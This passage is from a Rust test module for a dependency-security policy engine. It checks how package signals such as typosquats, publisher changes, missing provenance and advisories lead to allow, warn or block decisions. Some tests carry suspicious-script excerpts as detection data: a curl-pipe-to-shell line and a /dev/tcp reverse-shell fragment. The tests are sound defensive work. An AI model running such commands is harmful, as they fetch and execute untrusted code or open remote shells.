        let mut sorted = DEFAULT_SCRIPT_ALLOWLIST.to_vec();
        sorted.sort_unstable();
        assert_eq!(sorted.as_slice(), DEFAULT_SCRIPT_ALLOWLIST);
    }

    #[test]
    fn unsupported_policy_version_rejected() {
        let err = Policy::from_yaml("policyVersion: 2\n").unwrap_err();
        assert!(matches!(err, PolicyError::UnsupportedVersion(2)));
    }

    #[test]
    fn severity_demotes_release_age_to_warn() {
        let p = Policy::from_yaml(
            "policyVersion: 1\n\
             defaults:\n  minimumReleaseAge: 1440\n\
             severity:\n  release-age-below-threshold: warn\n",
        )
        .unwrap();
        let now = Utc::now();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublishedAt {
            at: now - Duration::minutes(60),
        });
        let d = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            now,
        );
        match d {
            Decision::Warn { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "release-age-below-threshold");
            }
            other => panic!("expected Warn, got {other:?}"),
        }
    }

    #[test]
    fn severity_allow_suppresses_reason() {
        let p = Policy::from_yaml(
            "policyVersion: 1\n\
             defaults:\n  blockExoticSubdeps: true\n\
             severity:\n  exotic-source: allow\n",
        )
        .unwrap();
        let d = p.evaluate(
            &dep(
                "x",
                false,
                Source::Git {
                    url: "https://x".into(),
                    reference: None,
                },
            ),
            &SignalSet::default(),
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn block_takes_precedence_but_includes_warns() {
        // exotic-source stays at default (block); release-age demoted to warn.
        // Both fire — overall must be Block, but the warn reason should be
        // surfaced too so the developer sees the full picture.
        let p = Policy::from_yaml(
            "policyVersion: 1\n\
             defaults:\n  minimumReleaseAge: 1440\n  blockExoticSubdeps: true\n\
             severity:\n  release-age-below-threshold: warn\n",
        )
        .unwrap();
        let now = Utc::now();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublishedAt {
            at: now - Duration::minutes(60),
        });
        let d = p.evaluate(
            &dep(
                "x",
                false,
                Source::Git {
                    url: "https://x".into(),
                    reference: None,
                },
            ),
            &signals,
            now,
        );
        match d {
            Decision::Block { reasons } => {
                let codes: Vec<_> = reasons.iter().map(Reason::code).collect();
                assert!(codes.contains(&"exotic-source"));
                assert!(codes.contains(&"release-age-below-threshold"));
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn ignore_scripts_demotes_lifecycle_to_warn() {
        let p =
            Policy::from_yaml("policyVersion: 1\nscripts:\n  policy: deny-by-default\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        let d = p.evaluate_with(
            &dep("malware", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
            EvalContext {
                ignore_scripts: true,
            },
        );
        match d {
            Decision::Warn { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "lifecycle-script-ignored");
            }
            other => panic!("expected Warn, got {other:?}"),
        }
    }

    #[test]
    fn severity_can_promote_ignored_back_to_block() {
        let p = Policy::from_yaml(
            "policyVersion: 1\n\
             scripts:\n  policy: deny-by-default\n\
             severity:\n  lifecycle-script-ignored: block\n",
        )
        .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        let d = p.evaluate_with(
            &dep("malware", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
            EvalContext {
                ignore_scripts: true,
            },
        );
        assert!(d.is_block(), "got {d:?}");
    }

    #[test]
    fn publisher_change_blocks_when_enabled() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  detectPublisherChange: true\n")
            .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublisherChange {
            previous_version: "1.7.8".into(),
            previous: "alice".into(),
            current: "mallory".into(),
        });
        let d = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "publisher-change");
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn publisher_change_silent_when_disabled() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublisherChange {
            previous_version: "1.7.8".into(),
            previous: "alice".into(),
            current: "mallory".into(),
        });
        let d = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow));
    }

    #[test]
    fn publisher_change_can_be_demoted_to_warn() {
        let p = Policy::from_yaml(
            "policyVersion: 1\n\
             defaults:\n  detectPublisherChange: true\n\
             severity:\n  publisher-change: warn\n",
        )
        .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublisherChange {
            previous_version: "1.7.8".into(),
            previous: "alice".into(),
            current: "mallory".into(),
        });
        let d = p.evaluate(
            &dep("axios", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Warn { .. }), "got {d:?}");
    }

    #[test]
    fn publisher_change_direct_only_via_override() {
        // Defaults off; direct override on. Direct deps detect, transitive ignore.
        let p = Policy::from_yaml("policyVersion: 1\ndirect:\n  detectPublisherChange: true\n")
            .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublisherChange {
            previous_version: "1.7.8".into(),
            previous: "alice".into(),
            current: "mallory".into(),
        });
        let direct = p.evaluate(
            &dep("axios", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(direct.is_block(), "direct should block: {direct:?}");
        let transitive = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(transitive, Decision::Allow));
    }

    #[test]
    fn deprecated_blocks_when_enabled_and_carries_message() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  flagDeprecated: true\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::DeprecatedVersion {
            message: Some("use foo@2 instead".into()),
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                match &reasons[0] {
                    Reason::DeprecatedVersion { message } => {
                        assert_eq!(message.as_deref(), Some("use foo@2 instead"));
                    }
                    other => panic!("wrong reason: {other:?}"),
                }
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn deprecated_silent_when_disabled() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::DeprecatedVersion { message: None });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow));
    }

    #[test]
    fn deprecated_demotable_to_warn_with_no_message() {
        let p = Policy::from_yaml(
            "policyVersion: 1\n\
             defaults:\n  flagDeprecated: true\n\
             severity:\n  deprecated-version: warn\n",
        )
        .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::DeprecatedVersion { message: None });
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Warn { .. }), "got {d:?}");
    }

    #[test]
    fn deprecated_direct_only_via_override() {
        let p = Policy::from_yaml("policyVersion: 1\ndirect:\n  flagDeprecated: true\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::DeprecatedVersion { message: None });
        let direct = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(direct.is_block(), "direct should block: {direct:?}");
        let transitive = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(transitive, Decision::Allow));
    }

    #[test]
    fn suspicious_script_blocks_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::SuspiciousScript {
            script: "postinstall".into(),
            pattern: "curl-pipe-shell".into(),
            excerpt: "curl https://x | sh".into(),
        });
        let d = p.evaluate(
            &dep("evil", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "suspicious-script");
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn suspicious_script_demotable_to_warn() {
        let p =
            Policy::from_yaml("policyVersion: 1\nseverity:\n  suspicious-script: warn\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::SuspiciousScript {
            script: "postinstall".into(),
            pattern: "curl-pipe-shell".into(),
            excerpt: "curl https://x | sh".into(),
        });
        let d = p.evaluate(
            &dep("evil", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Warn { .. }), "got {d:?}");
    }

    #[test]
    fn suspicious_script_emits_one_reason_per_finding() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::SuspiciousScript {
            script: "postinstall".into(),
            pattern: "curl-pipe-shell".into(),
            excerpt: "curl https://x | sh".into(),
        });
        signals.push(Signal::SuspiciousScript {
            script: "postinstall".into(),
            pattern: "dev-tcp-reverse-shell".into(),
            excerpt: "/dev/tcp/h/9".into(),
        });
        let d = p.evaluate(
            &dep("evil", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 2);
                assert!(reasons.iter().all(|r| r.code() == "suspicious-script"));
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn version_surface_change_off_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::VersionSurfaceChange {
            previous_version: "1.0.0".into(),
            added_bins: vec!["new-cli".into()],
            added_scripts: vec!["postinstall".into()],
        });
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn version_surface_change_blocks_when_enabled() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  detectVersionSurfaceChange: true\n")
                .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::VersionSurfaceChange {
            previous_version: "1.0.0".into(),
            added_bins: vec!["new-cli".into()],
            added_scripts: vec![],
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "version-surface-change");
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn version_surface_change_direct_only_via_override() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndirect:\n  detectVersionSurfaceChange: true\n")
                .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::VersionSurfaceChange {
            previous_version: "1.0.0".into(),
            added_bins: vec![],
            added_scripts: vec!["postinstall".into()],
        });
        let direct = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(direct.is_block(), "direct should block: {direct:?}");
        let transitive = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(transitive, Decision::Allow));
    }

    #[test]
    fn dist_tag_anomaly_warns_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::DistTagAnomaly {
            latest_version: "1.1.0".into(),
            highest_published: "2.0.0".into(),
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Warn { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "dist-tag-anomaly");
            }
            other => panic!("expected Warn, got {other:?}"),
        }
    }

    #[test]
    fn dist_tag_anomaly_promotable_to_block() {
        let p =
            Policy::from_yaml("policyVersion: 1\nseverity:\n  dist-tag-anomaly: block\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::DistTagAnomaly {
            latest_version: "1.1.0".into(),
            highest_published: "2.0.0".into(),
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Block { .. }), "got {d:?}");
    }

    /// A `Signal::Unavailable` (provider failed) must not fail an
    /// install on its own — absence of evidence is not evidence of
    /// compromise. Operators who want strict-fail-closed semantics
    /// can promote with `severity.signal-unavailable: block`.
    #[test]
    fn signal_unavailable_warns_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::Unavailable {
            provider: "npm-registry".into(),
            reason: "HTTP 503".into(),
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Warn { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "signal-unavailable");
            }
            other => panic!("expected Warn, got {other:?}"),
        }
    }

    #[test]
    fn signal_unavailable_promotable_to_block() {
        let p = Policy::from_yaml("policyVersion: 1\nseverity:\n  signal-unavailable: block\n")
            .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::Unavailable {
            provider: "npm-registry".into(),
            reason: "HTTP 503".into(),
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Block { .. }), "got {d:?}");
    }

    /// Workspace members are first-party code; the policy must
    /// short-circuit to Allow without consulting any signal.
    /// Otherwise a private `@scope/name` would 404 against the
    /// public registry and surface as a noisy
    /// `signal-unavailable` warn.
    #[test]
    fn workspace_source_short_circuits_to_allow() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        // Even with a normally-blocking signal present, workspace
        // deps are exempt — they're code we wrote, not something
        // we resolve from a registry.
        signals.push(Signal::Unavailable {
            provider: "npm-registry".into(),
            reason: "HTTP 404".into(),
        });
        let workspace_dep = ResolvedDependency {
            ecosystem: Ecosystem::Npm,
            name: "@acme/api".into(),
            version: "0.1.0".into(),
            integrity: None,
            source: Source::Workspace,
            direct: true,
            requested_by: vec![],
        };
        assert!(matches!(
            p.evaluate(&workspace_dep, &signals, Utc::now()),
            Decision::Allow
        ));
    }

    /// `attr-accept@2.2.5` shipped in real lockfiles with
    /// `dist-tags.latest = 2.2.5` while `3.0.0` was also published
    /// on a separate release line. The user is on the version
    /// `latest` advertises and is therefore unaffected by the
    /// anomaly; we must not block them.
    #[test]
    fn dist_tag_anomaly_suppressed_when_resolved_equals_latest() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::DistTagAnomaly {
            latest_version: "1.0.0".into(),
            highest_published: "2.0.0".into(),
        });
        // `dep()` produces a dependency at version 1.0.0 — same as
        // `latest_version` above.
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn name_squat_blocks_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::NameSquat {
            style: "typo".into(),
            target: "axios".into(),
        });
        let d = p.evaluate(
            &dep("axois", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "name-squat");
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn name_squat_demotable_to_warn() {
        let p = Policy::from_yaml("policyVersion: 1\nseverity:\n  name-squat: warn\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::NameSquat {
            style: "homoglyph".into(),
            target: "lodash".into(),
        });
        let d = p.evaluate(
            &dep("lod\u{0430}sh", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Warn { .. }), "got {d:?}");
    }

    /// `gaxios` is Google's official HTTP client — Levenshtein-1
    /// from `axios` but not a typosquat. Operators must be able to
    /// suppress the finding for specific known-legitimate names
    /// without disabling the detector globally for the whole
    /// dependency tree.
    #[test]
    fn name_squat_suppressed_by_allowlist() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  nameSquatAllow: [gaxios]\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::NameSquat {
            style: "typo".into(),
            target: "axios".into(),
        });
        let d = p.evaluate(
            &dep("gaxios", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    /// Allowlist must not leak: a different name that is also flagged
    /// continues to fire even when the allowlist is non-empty.
    #[test]
    fn name_squat_allowlist_is_exact_match_only() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  nameSquatAllow: [gaxios]\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::NameSquat {
            style: "typo".into(),
            target: "lodash".into(),
        });
        let d = p.evaluate(
            &dep("lodahs", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Block { .. }), "got {d:?}");
    }

    #[test]
    fn maintainer_new_account_off_when_threshold_zero() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::MaintainerNewAccount {
            account: "alice".into(),
            age_days: 1,
        });
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn maintainer_new_account_blocks_below_threshold() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  minMaintainerAccountAgeDays: 30\n")
                .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::MaintainerNewAccount {
            account: "alice".into(),
            age_days: 7,
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "maintainer-new-account");
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn maintainer_new_account_quiet_above_threshold() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  minMaintainerAccountAgeDays: 30\n")
                .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::MaintainerNewAccount {
            account: "alice".into(),
            age_days: 365,
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn require_provenance_off_by_default() {
        let p = Policy::default();
        let signals = SignalSet::default();
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn require_provenance_blocks_when_signal_absent() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  requireProvenance: true\n").unwrap();
        let signals = SignalSet::default();
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert_eq!(reasons.len(), 1);
                assert_eq!(reasons[0].code(), "provenance-missing");
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn require_provenance_quiet_when_signal_present() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  requireProvenance: true\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::ProvenanceClaimed {
            bundle_url: "https://r/att".into(),
        });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn require_provenance_direct_only_override() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndirect:\n  requireProvenance: true\n").unwrap();
        let signals = SignalSet::default();
        // Transitive dep — direct override does NOT apply.
        let d_trans = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d_trans, Decision::Allow));
        // Direct dep — override fires.
        let d_direct = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d_direct, Decision::Block { .. }));
    }

    #[test]
    fn trust_score_off_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        // A signal that would tank the score, but threshold is 0.
        signals.push(Signal::NameSquat {
            style: "typo".into(),
            target: "react".into(),
        });
        // Allow other reasons (NameSquat itself blocks); just confirm
        // no TrustScoreBelowThreshold reason emitted.
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        if let Decision::Block { reasons } = &d {
            assert!(
                reasons
                    .iter()
                    .all(|r| r.code() != "trust-score-below-threshold"),
                "did not expect trust-score reason: {reasons:?}"
            );
        }
    }

    #[test]
    fn trust_score_blocks_below_threshold() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  minTrustScore: 80\n").unwrap();
        let mut signals = SignalSet::default();
        // 100 - 15 - 10 = 75 < 80 — fires.
        signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        signals.push(Signal::DeprecatedVersion { message: None });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                assert!(reasons.iter().any(|r| matches!(
                    r,
                    Reason::TrustScoreBelowThreshold {
                        score: 75,
                        threshold: 80
                    }
                )));
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn trust_score_quiet_above_threshold() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  minTrustScore: 70\n").unwrap();
        let mut signals = SignalSet::default();
        // 100 - 10 = 90 >= 70.
        signals.push(Signal::DeprecatedVersion { message: None });
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        // DeprecatedVersion fires its own reason, but trust-score
        // should not — verify it's absent.
        if let Decision::Block { reasons } = d {
            assert!(reasons
                .iter()
                .all(|r| r.code() != "trust-score-below-threshold"));
        }
    }

    fn advisory(severity: &str) -> Signal {
        Signal::AdvisoryKnown {
            id: format!("OSV:GHSA-{severity}-test"),
            severity: severity.to_string(),
            summary: "test advisory".into(),
            source: "osv".into(),
        }
    }

    #[test]
    fn advisory_gate_off_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(advisory("critical"));
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        // No reason fires when the gate is off, regardless of
        // signal severity.
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn advisory_gate_blocks_at_or_above_floor() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  maxAdvisorySeverity: high\n")
            .unwrap();
        let mut signals = SignalSet::default();
        signals.push(advisory("high"));
        signals.push(advisory("critical"));
        signals.push(advisory("medium")); // below floor
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        match d {
            Decision::Block { reasons } => {
                let codes: Vec<&str> = reasons.iter().map(Reason::code).collect();
                let advisory_count = codes.iter().filter(|c| **c == "advisory-known").count();
                assert_eq!(
                    advisory_count, 2,
                    "expected 2 advisory reasons, got {codes:?}"
                );
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn advisory_gate_unknown_only_fires_when_floor_is_unknown() {
        // floor=low must NOT fire on unknown — unknown is a
        // separate sentinel, not a synonym for low.
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  maxAdvisorySeverity: low\n").unwrap();
        let mut signals = SignalSet::default();
        signals.push(advisory("unknown"));
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");

        // floor=unknown DOES catch unknown.
        let p2 = Policy::from_yaml("policyVersion: 1\ndefaults:\n  maxAdvisorySeverity: unknown\n")
            .unwrap();
        let d2 = p2.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d2, Decision::Block { .. }), "got {d2:?}");
    }

    fn project(licenses: &[&str], archived: Option<bool>) -> Signal {
        Signal::ProjectMetadata {
            licenses: licenses.iter().map(|s| (*s).to_string()).collect(),
            archived,
            source: "deps.dev".into(),
        }
    }

    #[test]
    fn license_gates_off_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(project(&[], Some(true)));
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn require_license_fires_only_on_empty_list() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  requireLicense: true\n").unwrap();
        let mut empty = SignalSet::default();
        empty.push(project(&[], None));
        let d_empty = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &empty,
            Utc::now(),
        );
        assert!(matches!(d_empty, Decision::Block { .. }));

        let mut populated = SignalSet::default();
        populated.push(project(&["MIT"], None));
        let d_ok = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &populated,
            Utc::now(),
        );
        assert!(matches!(d_ok, Decision::Allow));
    }

    #[test]
    fn license_allowlist_blocks_disallowed_and_is_case_insensitive() {
        let p = Policy::from_yaml(
            "policyVersion: 1\ndefaults:\n  licenseAllowlist: [\"MIT\", \"Apache-2.0\"]\n",
        )
        .unwrap();
        let mut allowed = SignalSet::default();
        allowed.push(project(&["mit"], None));
        let d_allowed = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &allowed,
            Utc::now(),
        );
        assert!(matches!(d_allowed, Decision::Allow));
        let mut bad = SignalSet::default();
        bad.push(project(&["GPL-3.0"], None));
        let d_bad = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &bad,
            Utc::now(),
        );
        match d_bad {
            Decision::Block { reasons } => {
                assert!(reasons.iter().any(|r| matches!(
                    r,
                    Reason::LicenseDisallowed { licenses, .. }
                        if licenses == &vec!["GPL-3.0".to_string()]
                )));
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }

    #[test]
    fn block_archived_only_fires_when_archived_true() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  blockArchived: true\n").unwrap();
        let mut archived = SignalSet::default();
        archived.push(project(&["MIT"], Some(true)));
        let d_archived = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &archived,
            Utc::now(),
        );
        assert!(matches!(d_archived, Decision::Block { .. }));

        let mut not_archived = SignalSet::default();
        not_archived.push(project(&["MIT"], Some(false)));
        let d_not = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &not_archived,
            Utc::now(),
        );
        assert!(matches!(d_not, Decision::Allow));

        // Unknown archived status (None) does not fire — silence
        // is not suspicion.
        let mut unknown = SignalSet::default();
        unknown.push(project(&["MIT"], None));
        let d_unknown = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &unknown,
            Utc::now(),
        );
        assert!(matches!(d_unknown, Decision::Allow));
    }

    fn scorecard(score: u8) -> Signal {
        Signal::ScorecardScore {
            score,
            repo: "github.com/foo/bar".into(),
            source: "openssf-scorecard".into(),
        }
    }

    #[test]
    fn scorecard_gate_off_by_default() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(scorecard(1));
        let d = p.evaluate(
            &dep("foo", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow), "got {d:?}");
    }

    #[test]
    fn scorecard_gate_blocks_below_floor_and_passes_at_or_above() {
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  minScorecardScore: 5\n").unwrap();
        let mut low = SignalSet::default();
        low.push(scorecard(3));
        let d_low = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &low,
            Utc::now(),
        );
        match d_low {
            Decision::Block { reasons } => assert!(reasons.iter().any(|r| matches!(
                r,
                Reason::ScorecardBelowThreshold {
                    score: 3,
                    threshold: 5,
                    ..
                }
            ))),
            other => panic!("expected Block, got {other:?}"),
        }

        let mut at = SignalSet::default();
        at.push(scorecard(5));
        let d_at = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &at,
            Utc::now(),
        );
        assert!(matches!(d_at, Decision::Allow));
    }

    #[test]
    fn scorecard_gate_silent_without_signal() {
        // Floor armed but no scorecard signal → no reason fires.
        let p = Policy::from_yaml("policyVersion: 1\ndefaults:\n  minScorecardScore: 7\n").unwrap();
        let signals = SignalSet::default();
        let d = p.evaluate(
            &dep("foo", false, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow));
    }
}
